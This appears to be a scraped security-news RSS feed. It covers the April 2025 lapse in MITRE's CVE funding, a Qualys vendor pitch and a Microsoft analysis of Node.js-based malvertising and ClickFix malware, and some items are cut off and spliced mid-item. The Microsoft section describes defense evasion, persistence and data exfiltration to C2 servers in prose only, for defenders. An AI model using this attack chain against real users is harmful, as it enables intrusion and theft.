&lt;p&gt;To illustrate, consider the recent vulnerability of CVE-2025-3619, a critical Heap buffer overflow vulnerability in Google Chrome&amp;#8217;s Codecs, identified on April 15, 2025. Despite not being listed on CVE.org or NVD yet, Qualys has already provided detection through QID 383098, enabling our customers to promptly assess and mitigate the risk. This demonstrates our commitment to maintaining comprehensive vulnerability coverage through diverse data sources and proactive research.&lt;/p&gt;



&lt;p&gt;The Qualys Threat Research Unit (TRU) will continue to push clear patch recommendations based on vendor advisories and prioritization guidance using various threat intelligence feeds, ensuring customers always know which fixes to deploy—regardless of any CVE feed delays.&lt;/p&gt;



&lt;p&gt;In addition, Qualys demonstrates its commitment to having customers&amp;#8217; backs through the launch of the &lt;a href="https://blog.qualys.com/product-tech/2023/02/08/introducing-qualys-ml-based-threat-intelligence"&gt;Qualys Cloud Threat Database&lt;/a&gt; over two years ago. This database presents a powerful tool that unifies over 25 threat intelligence feeds into a single, accessible source for all Qualys products. By leveraging machine learning and the expertise of the Qualys Threat Research Unit, this database provides rich, contextual insights into vulnerabilities, malware, and threat actors, empowering customers to prioritize and remediate risks effectively. With real-time threat intelligence and risk-based vulnerability management, Qualys ensures organizations have the clarity and tools to stay secure in an ever-evolving threat landscape.&lt;/p&gt;



&lt;p&gt;Qualys leads in cybersecurity by providing end-to-end security solutions that ensure long-term resilience for organizations. Our Threat Research Unit and advanced capabilities help secure diverse IT environments—from AI systems to cloud applications—while mitigating critical threats like zero days. With decades of expertise, we deliver tailored, innovative strategies that keep organizations ahead of evolving risks.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="if-a-cve-service-gap-occurs"&gt;&lt;strong&gt;If a CVE Service Gap Occurs&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;During such an interruption, a CVE&amp;nbsp;Services outage would halt the issuance of new CVE&amp;nbsp;IDs, leaving freshly disclosed vulnerabilities absent from CVE.org, the NVD, CISA KEV, and other mirrors. This could create temporary coverage gaps for security products that depend solely on those feeds.&lt;/p&gt;



&lt;p&gt;Even in the unlikely event of a CVE publishing gap, your Qualys detections will keep pace with the latest threats—no blind spots, no extra work.&lt;/p&gt;



&lt;p&gt;If you want game-changing risk scoring in uncertain times, &lt;a href="https://www.qualys.com/forms/schedule-demo/"&gt;reach out to find out more&lt;/a&gt; about Qualys and how our solutions offer unprecedented insight.&lt;/p&gt;

The federally funded, non-profit research and development organization &lt;strong&gt;MITRE&lt;/strong&gt; warned today that its contract to maintain the &lt;strong&gt;Common Vulnerabilities and Exposures&lt;/strong&gt; (CVE) program &amp;#8212; which is traditionally funded each year by the Department of Homeland Security &amp;#8212; expires on April 16.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_71016" style="width: 752px;"&gt;&lt;img alt="" class=" wp-image-71016" height="942" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/mitreletter.png" width="742" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-71016"&gt;A letter from MITRE vice president Yosry Barsoum, warning that the funding for the CVE program will expire on April 16, 2025.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Tens of thousands of security flaws in software are found and reported every year, and these vulnerabilities are eventually assigned their own unique CVE tracking number (e.g. &lt;a href="https://www.cve.org/CVERecord?id=CVE-2024-43573" rel="noopener" target="_blank"&gt;CVE-2024-43573&lt;/a&gt;, which is a &lt;strong&gt;Microsoft Windows&lt;/strong&gt; bug that Redmond patched last year).&lt;/p&gt;
&lt;p&gt;There are hundreds of organizations &amp;#8212; known as &lt;strong&gt;CVE Numbering Authorities&lt;/strong&gt; (CNAs) &amp;#8212; that are authorized by MITRE to bestow these CVE numbers on newly reported flaws. Many of these CNAs are country and government-specific, or tied to individual software vendors or vulnerability disclosure platforms (a.k.a. bug bounty programs).&lt;/p&gt;
&lt;p&gt;Put simply, MITRE is a critical, widely-used resource for centralizing and standardizing information on software vulnerabilities. That means the pipeline of information it supplies is plugged into an array of cybersecurity tools and services that help organizations identify and patch security holes &amp;#8212; ideally before malware or malcontents can wriggle through them.&lt;/p&gt;
&lt;p&gt;&amp;#8220;What the CVE lists really provide is a standardized way to describe the severity of that defect, and a centralized repository listing which versions of which products are defective and need to be updated,&amp;#8221; said &lt;a href="https://www.lawfaremedia.org/contributors/mtait" rel="noopener" target="_blank"&gt;Matt Tait&lt;/a&gt;, chief operating officer of &lt;strong&gt;Corellium&lt;/strong&gt;, a cybersecurity firm that sells phone-virtualization software for finding security flaws.&lt;/p&gt;
&lt;p&gt;In a letter sent today to the CVE board, MITRE Vice President &lt;strong&gt;Yosry Barsoum &lt;/strong&gt;warned that on April 16, 2025, &amp;#8220;the current contracting pathway for MITRE to develop, operate and modernize CVE and several other related programs will expire.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;If a break in service were to occur, we anticipate multiple impacts to CVE, including deterioration of national vulnerability databases and advisories, tool vendors, incident response operations, and all manner of critical infrastructure,&amp;#8221; Barsoum wrote.&lt;/p&gt;
&lt;p&gt;MITRE told KrebsOnSecurity the CVE website listing vulnerabilities will remain up after the funding expires, but that new CVEs won&amp;#8217;t be added after April 16.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_71017" style="width: 760px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/04/CVE-Lifecycle.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-71017" height="335" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/CVE-Lifecycle.png" width="750" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-71017"&gt;A representation of how a vulnerability becomes a CVE, and how that information is consumed.

&lt;p&gt;DHS officials did not immediately respond to a request for comment. The program is funded through DHS&amp;#8217;s &lt;strong&gt;Cybersecurity &amp;amp; Infrastructure Security Agency&lt;/strong&gt; (CISA), which is currently facing &lt;a href="https://krebsonsecurity.com/2025/04/trump-revenge-tour-targets-cyber-leaders-elections/" rel="noopener" target="_blank"&gt;deep budget and staffing cuts by the Trump administration&lt;/a&gt;. The &lt;a href="https://www.usaspending.gov/award/CONT_AWD_70RCSJ24FR0000019_7001_70RSAT20D00000001_7001" rel="noopener" target="_blank"&gt;CVE contract&lt;/a&gt; available at USAspending.gov says the project was awarded approximately $40 million last year.&lt;br /&gt;
&lt;span id="more-71010"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Former CISA Director&lt;strong&gt; Jen Easterly&lt;/strong&gt; said the CVE program is a bit like the Dewey Decimal System, but for cybersecurity.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It’s the global catalog that helps everyone—security teams, software vendors, researchers, governments—organize and talk about vulnerabilities using the same reference system,&amp;#8221; Easterly said in &lt;a href="https://www.linkedin.com/feed/update/urn:li:activity:7318021583191617538/" rel="noopener" target="_blank"&gt;a post on LinkedIn&lt;/a&gt;. &amp;#8220;Without it, everyone is using a different catalog or no catalog at all, no one knows if they’re talking about the same problem, defenders waste precious time figuring out what’s wrong, and worst of all, threat actors take advantage of the confusion.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;John Hammond&lt;/strong&gt;, principal security researcher at the managed security firm &lt;strong&gt;Huntress&lt;/strong&gt;, &lt;a href="https://www.reuters.com/technology/us-funding-running-out-critical-cyber-vulnerability-database-manager-says-2025-04-15/" rel="noopener" target="_blank"&gt;told Reuters&lt;/a&gt; he swore out loud when he heard the news that CVE&amp;#8217;s funding was in jeopardy, and that losing the CVE program would be like losing &amp;#8220;the language and lingo we used to address problems in cybersecurity.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;I really can&amp;#8217;t help but think this is just going to hurt,&amp;#8221; said Hammond, who posted &lt;a href="https://www.youtube.com/watch?v=itbsfeqrRY4" rel="noopener" target="_blank"&gt;a Youtube video&lt;/a&gt; to vent about the situation and alert others.&lt;/p&gt;
&lt;p&gt;Several people close to the matter told KrebsOnSecurity this is not the first time the CVE program&amp;#8217;s budget has been left in funding limbo until the last minute. Barsoum&amp;#8217;s letter, which was apparently leaked, sounded a hopeful note, saying the government is making &amp;#8220;considerable efforts to continue MITRE&amp;#8217;s role in support of the program.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Tait said that without the CVE program, risk managers inside companies would need to continuously monitor many other places for information about new vulnerabilities that may jeopardize the security of their IT networks. Meaning, it may become more common that software updates get mis-prioritized, with companies having hackable software deployed for longer than they otherwise would, he said.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Hopefully they will resolve this, but otherwise the list will rapidly fall out of date and stop being useful,&amp;#8221; he said.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update, April 16, 11:00 a.m. ET:&lt;/strong&gt; The CVE board today announced the creation of non-profit entity called &lt;strong&gt;The CVE Foundation &lt;/strong&gt;that will continue the program&amp;#8217;s work under a new, unspecified funding mechanism and organizational structure.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Since its inception, the CVE Program has operated as a U.S. government-funded initiative, with oversight and management provided under contract,&amp;#8221; the press release reads. &amp;#8220;While this structure has supported the program&amp;#8217;s growth, it has also raised longstanding concerns among members of the CVE Board about the sustainability and neutrality of a globally relied-upon resource being tied to a single government sponsor.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The organization&amp;#8217;s website, &lt;a href="https://www.thecvefoundation.org/home" rel="noopener" target="_blank"&gt;thecvefoundation.org&lt;/a&gt;, is less than a day old and currently hosts no content other than the press release heralding its creation. The announcement said the foundation would release more information about its structure and transition planning in the coming days.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update, April 16, 4:26 p.m. ET:&lt;/strong&gt; MITRE issued a statement today saying it &amp;#8220;identified incremental funding to keep the programs operational. We appreciate the overwhelming support for these programs that have been expressed by the global cyber community, industry and government over the last 24 hours. The government continues to make considerable efforts to support MITRE&amp;#8217;s role in the program and MITRE remains committed to CVE and CWE as global resources.&amp;#8221;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=71010</guid><category>A Little Sunshine</category><category>Latest Warnings</category><category>The Coming Storm</category><category>Common Vulnerabilities and Exposures</category><category>Corellium</category><category>CVE</category><category>CVE Numbering Authorities</category><category>Matt Tait</category><category>MITRE</category></item><item><title>ISC Stormcast For Wednesday, April 16th, 2025 https://isc.sans.edu/podcastdetail/9410, (Wed, Apr 16th)</title><link>https://isc.sans.edu/diary/rss/31864</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31864</guid></item><item><title>CrazyHunter Campaign Targets Taiwanese Critical Sectors</title><link>https://www.trendmicro.com/en_us/research/25/d/crazyhunter-campaign.html</link><description>This blog entry details research on emerging ransomware group CrazyHunter, which has launched a sophisticated campaign aimed at Taiwan's essential services.</description><guid isPermaLink="false">urn:uuid:beb8f883-032a-c07c-3a2f-00cf8a5c155f</guid><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Here’s What Happened to Those SignalGate Messages</title><link>https://www.wired.com/story/heres-what-happened-to-those-signalgate-messages/</link><description>A lawsuit over the Trump administration’s infamous Houthi Signal group chat has revealed what steps departments took to preserve the messages—and how little they actually saved.</description><guid isPermaLink="false">67fe58e85ea31c262748eb2e</guid><category>Security</category><category>Security / National Security</category><category>Security / Privacy</category><category>Security / Security News</category><category>Politics / Politics News</category><category>privacy</category><category>surveillance</category><category>Donald Trump</category><category>politics</category><category>National Affairs</category><category>end-to-end encryption</category><category>national security</category><category>Signal</category><category>Autodelete</category></item><item><title>UK AI Copyright Rules May Backfire, Causing Biased Models &amp;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/15/threat-actors-misuse-node-js-to-deliver-malware-and-other-malicious-payloads/"&gt;Threat actors misuse Node.js to deliver malware and other malicious payloads&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Since October 2024, Microsoft Defender Experts (DEX) has observed and helped multiple customers address campaigns leveraging Node.js to deliver malware and other payloads that ultimately lead to information theft and data exfiltration. While traditional scripting languages like Python, PHP, and AutoIT remain widely used in threats, threat actors are now leveraging compiled JavaScript—or even running the scripts directly in the command line using Node.js—to facilitate malicious activity. This shift in threat actor techniques, tactics, and procedures (TTPs) might indicate that while Node.js-related malware aren’t as prevalent, they’re quickly becoming a part of the continuously evolving threat landscape.&lt;/p&gt;



&lt;p&gt;Node.js is an open-source, cross-platform JavaScript runtime environment that allows JavaScript code to run outside of a web browser. It’s widely used and trusted by developers because it lets them build frontend and backend applications. However, threat actors are also leveraging these Node.js characteristics to try to blend malware with legitimate applications, bypass conventional security controls, and persist in target environments. &amp;nbsp;&lt;br /&gt;&lt;br /&gt;Among the most recent attacks we’ve observed leveraging Node.js include a malvertising campaign related to cryptocurrency trading that attempts to lure users into downloading a malicious installer disguised as legitimate software. The said campaign is still active as of April 2025. This blog provides details of its attack chain, along with an example of the emerging inline script execution technique. This blog also includes recommendations to help users and defenders reduce the impact of these attacks in their environments.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="malicious-ads-deliver-compiled-node-js-executables"&gt;Malicious ads deliver compiled Node.js executables&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/en-us/microsoft-365-life-hacks/privacy-and-safety/what-is-malvertising"&gt;Malvertising&lt;/a&gt; has been one of the most prevalent techniques in Node.js attacks we’ve observed in customer environments. Attackers use malvertising campaigns to lure targets to fraudulent websites, where the targets then unknowingly download a malicious installer disguised as legitimate software. These fake websites often take advantage of popular themes such as financial services, software updates, and trending applications.&lt;/p&gt;



&lt;p&gt;In this campaign, the downloaded installer contains a malicious DLL that gathers system information and sets up a scheduled task for persistence. This sets the stage for its other techniques and activities, such as defense evasion, data collection, and payload delivery and execution.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Diagram of the campaign depicting the threat actor luring target users into downloading an installer using malvertisements. The installer creates a scheduled task to run PowerShell commands and downloads additional scripts from C2 to perform various defense evasion tactics, like excluding a process and folder from being scanned. Detailed information such as system, user, and browser data is harvested and sent to the threat actor's C2 through HTTP POST." class="wp-image-138454 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Figure-1.-Overview-of-the-malvertising-campaign-leveraging-Node.js.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1. Overview of the malvertising campaign leveraging Node.js&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="initial-access-and-persistence"&gt;Initial access and persistence&lt;/h3&gt;



&lt;p&gt;This campaign uses malicious ads with a cryptocurrency trading theme to lure the target user into visiting a website and downloading a malicious installer disguised as a legitimate file from cryptocurrency-trading platforms like Binance or TradingView. This installer is a Wix-built package containing a malicious &lt;em&gt;CustomActions.dll&lt;/em&gt;. When launched, the installer loads the DLL, which then gathers basic system information through a Windows Management Instrumentation (WMI) query and creates a scheduled task to ensure persistence of a PowerShell command. Simultaneously, the DLL launches a decoy by opening an &lt;em&gt;msedge_proxy&lt;/em&gt; window that displays a legitimate cryptocurrency trading website.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="defense-evasion"&gt;Defense evasion&lt;/h3&gt;



&lt;p&gt;The created scheduled task runs PowerShell commands designed to exclude both the PowerShell process and the current directory from being scanned by Microsoft Defender for Endpoint. This action prevents subsequent PowerShell executions from being flagged, allowing the attack to continue undisturbed.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of the command line used for exclusions" class="wp-image-138455 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Figure-2.-Command-line-used-for-the-exclusions.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2. Command line used for the exclusions&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="data-collection-and-exfiltration"&gt;Data collection and exfiltration&lt;/h3&gt;



&lt;p&gt;With the exclusions set, an obfuscated PowerShell command is then launched through scheduled tasks to continuously fetch and run scripts from remote URLs. These scripts gather detailed system information, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Windows information:&lt;/strong&gt; Registered owner, system root, installed software, email addresses&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;BIOS information:&lt;/strong&gt; Manufacturer, name, release date, version&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;System information:&lt;/strong&gt; Name, domain, manufacturer, model, domain membership, memory, logical processors, graphics processing units (GPUs), processors, network adapters&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Operating system information:&lt;/strong&gt; Name, version, locale, user access control (UAC) settings, country, language, time zone, install date&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;All this information is structured into a nested hash table, converted into JSON format, and then sent using HTTP POST to the attacker’s command-and-control (C2) server.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A screen shot of the malicious script that gathers and exfiltrates data" class="wp-image-138456 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Figure-3.-Excerpts-from-the-script-that-gathers-and-exfiltrates-data.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 3. Excerpts from the script that gathers and exfiltrates data&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="payload-delivery"&gt;Payload delivery&lt;/h3&gt;



&lt;p&gt;After the data collection activity, another PowerShell script is launched to perform the following actions:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Download an archive file from the C2 and extract its contents, which typically include:&lt;ul&gt;&lt;li&gt;&lt;em&gt;node.exe&lt;/em&gt; (Node.js runtime)&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;A JSC file (JavaScript compiled file)&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Several supporting library files/modules&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Turn off proxy settings in the Windows registry&lt;/li&gt;



&lt;li&gt;Launch the JSC that starts the attack’s next stage&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A screen shot of the malicious script that downloads and launches the payload" class="wp-image-138457 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Figure-4.-Excerpts-from-the-script-that-downloads-and-launches-the-payload.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 4. Excerpts from the script that downloads and launches the payload&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="payload-execution"&gt;Payload execution&lt;/h3&gt;



&lt;p&gt;The Node.js executable launches the downloaded JSC file, which then performs the following routines:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Load multiple library modules&lt;/li&gt;



&lt;li&gt;Establish network connections&lt;/li&gt;



&lt;li&gt;Add certificates to the device&lt;/li&gt;



&lt;li&gt;Read and possibly exfiltrate sensitive browser information&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;These routines might indicate follow-on malicious activities such as credential theft, evasion, or secondary payload execution, which are commonly observed in other malware campaigns leveraging Node.js.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of the command line used to launch the JSC file" class="wp-image-138459 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Figure-5.-Command-line-used-to-launch-the-JSC-file.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 5. Command line used to launch the JSC file&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="beyond-executables-inline-script-execution-in-node-js"&gt;Beyond executables: Inline script execution in Node.js&lt;/h2&gt;



&lt;p&gt;Another notable technique we’ve observed emerging from campaigns leveraging Node.js involves inline JavaScript execution. In this technique, malicious scripts are run directly through Node.js to facilitate the deployment of malware.&lt;/p&gt;



&lt;p&gt;One observed instance of this method was through a ClickFix social engineering attack, which attempts to deceive users into executing a malicious PowerShell command. This command initiates the download and installation of multiple components, including the Node.js binary (&lt;em&gt;node.exe&lt;/em&gt;) and additional required modules. Once all the files are in place, the PowerShell script uses the Node.js environment to execute a JavaScript code directly in the command, rather than running it from a file.&lt;/p&gt;



&lt;p&gt;The JavaScript further conducts network discovery by executing commands to map the domain structure and identify high-value assets. It also disguises the command-and-control traffic as legitimate Cloudflare activity and gains persistence by modifying registry run keys.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A screen shot of the malicious script, highlighting hardcoded C2 servers" class="wp-image-138460 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Figure-6.-Excerpts-from-the-malicious-script-highlighting-hardcoded-C2-servers.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 6. Excerpts from the malicious script, highlighting hardcoded C2 servers&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A screen shot of the malicious script except, highlighting core HTTP functions" class="wp-image-138461 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Figure-7.-Excerpts-from-the-malicious-script-highlighting-core-HTTP-functions.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 7. Excerpts from the malicious script, highlighting core HTTP functions&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="recommendations"&gt;Recommendations&lt;/h2&gt;



&lt;p&gt;Organizations can follow these recommendations to mitigate threats associated with Node.js misuse: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Educate users.&lt;/strong&gt; Warn them about the risks of downloading software from unverified sources. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Monitor Node.js execution.&lt;/strong&gt; Flag unauthorized &lt;em&gt;node.exe&lt;/em&gt; processes. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Enforce PowerShell logging.&lt;/strong&gt; Turn on script block logging to track obfuscation. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Turn&lt;/strong&gt;&lt;strong&gt; on endpoint protection.&lt;/strong&gt; Ensure endpoint detection and response (EDR) or extended detection and response (XDR) solutions are actively monitoring script execution. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Restrict outbound C2 communications.&lt;/strong&gt; Implement firewall rules to block suspicious domains. &lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Microsoft also recommends the following mitigations to reduce the impact of this threat.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Turn on &lt;a href="https://learn.microsoft.com/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus" rel="noreferrer noopener" target="_blank"&gt;cloud-delivered protection&lt;/a&gt; in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown threats.&lt;/li&gt;



&lt;li&gt;Run &lt;a href="https://learn.microsoft.com/defender-endpoint/edr-in-block-mode" rel="noreferrer noopener" target="_blank"&gt;EDR in block mode&lt;/a&gt; so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.&lt;/li&gt;



&lt;li&gt;Allow &lt;a href="https://learn.microsoft.com/defender-endpoint/automated-investigations" rel="noreferrer noopener" target="_blank"&gt;investigation and remediation&lt;/a&gt; in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.&lt;/li&gt;



&lt;li&gt;Understand and use PowerShell’s &lt;a href="https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_execution_policies"&gt;execution policies&lt;/a&gt;, which control how scripts are loaded and run. Set an appropriate execution policy based on your needs. Remember that execution policy alone is not foolproof; it can be bypassed.&lt;/li&gt;



&lt;li&gt;Turn on and monitor PowerShell logging.&lt;ul&gt;&lt;li&gt;Turn on script block logging, module logging, and transcription. These logs provide a trail of activity and help identify malicious behavior.&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Dive deeper into &lt;a href="https://learn.microsoft.com/powershell/scripting/security/security-features" rel="noreferrer noopener" target="_blank"&gt;PowerShell security features&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Turn on &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection"&gt;tamper protection features&lt;/a&gt; to prevent attackers from stopping security services. Combine tamper protection with the &lt;a href="https://learn.microsoft.com/windows/client-management/mdm/defender-csp"&gt;DisableLocalAdminMerge&lt;/a&gt; setting to prevent attackers from using local administrator privileges to set antivirus exclusions.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Microsoft Defender XDR customers can turn on&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction" rel="noreferrer noopener" target="_blank"&gt;attack surface reduction rules&lt;/a&gt;&amp;nbsp;to prevent common attack techniques:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-executable-files-from-running-unless-they-meet-a-prevalence-age-or-trusted-list-criterion" rel="noreferrer noopener" target="_blank"&gt;Block executable files from running unless they meet a prevalence, age, or trusted list criterion&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-execution-of-potentially-obfuscated-scripts" rel="noreferrer noopener" target="_blank"&gt;Block execution of potentially obfuscated scripts&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-javascript-or-vbscript-from-launching-downloaded-executable-content" rel="noreferrer noopener" target="_blank"&gt;Block JavaScript or VBScript from launching downloaded executable content&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/15/transforming-security-with-microsoft-security-exposure-management-initiatives/"&gt;​​Transforming security​ with Microsoft Security Exposure Management initiatives​ &lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Just as nature sheds its winter coat, it&amp;#8217;s time to prune outdated security measures and plant the seeds of a more robust defense. For years, &lt;a href="https://learn.microsoft.com/defender-xdr/microsoft-secure-score-improvement-actions"&gt;Microsoft Secure Score&lt;/a&gt; has served as a foundational tool for organizations to assess their security posture. By providing a numerical representation of security posture based on configurations and recommended controls within Microsoft products, it has offered valuable baseline measurements and helped organizations benchmark their efforts.&lt;/p&gt;



&lt;p&gt;However, as cybersecurity practices have matured, the limitations of relying solely on a single aggregate score have become evident. Security professionals and executives now require more granular insights to track specific objectives, address evolving cyberthreats, and effectively communicate the value of security investments. This shift reflects the need for tools that not only measure progress but also enable proactive transformation. In this blog, we’ll explore how &lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-security-exposure-management"&gt;Microsoft Security Exposure Management&lt;/a&gt; initiatives build on this foundation to offer a renewed perspective on managing cybersecurity risks.&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-1 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-security-exposure-management" rel="noreferrer noopener" target="_blank"&gt;Learn more about Microsoft Security Exposure Management&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="bridging-the-gap-between-security-metrics-and-business-outcomes"&gt;Bridging the gap between security metrics and business outcomes&lt;/h2&gt;



&lt;p&gt;
  A single security score, while useful for general benchmarking, can obscure critical vulnerabilities in specific areas. Customer feedback has revealed the need for security teams to simultaneously monitor multiple metrics to achieve a comprehensive understanding of their security posture. Furthermore, executives often struggle to translate these technical metrics into tangible business outcomes, creating a communication gap between security teams and leadership. This understanding has driven the development of security initiatives to provide scores for various security objectives. 
&lt;/p&gt;



